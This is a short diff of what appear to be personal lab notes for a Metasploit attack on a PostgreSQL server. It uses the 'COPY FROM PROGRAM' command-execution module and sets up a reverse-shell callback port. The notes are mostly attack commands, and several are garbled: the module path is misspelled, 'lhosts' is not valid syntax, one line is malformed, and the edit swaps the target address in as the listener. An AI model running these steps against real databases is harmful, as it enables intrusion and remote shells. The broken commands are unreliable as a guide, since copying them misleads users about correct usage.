@@ -29,7 +29,9 @@ LHOST comming back through our WAN
 
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > show options
 
-(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set rhosts 192.168.122.102
+(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lhosts 192.168.122.102
+
+(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lhosts port 61775
 
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > show options [this is to validate config]
 
@@ -37,7 +39,7 @@ LHOST comming back through our WAN
 
 [Found out that you need creds for this route hard stop]
 
-(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lhosts 192.168.122.102
+(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lhosts 192.168.122.102 [3:29][DAY 11]
 
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lport 61775 [use your manual port for reverse shells]
 
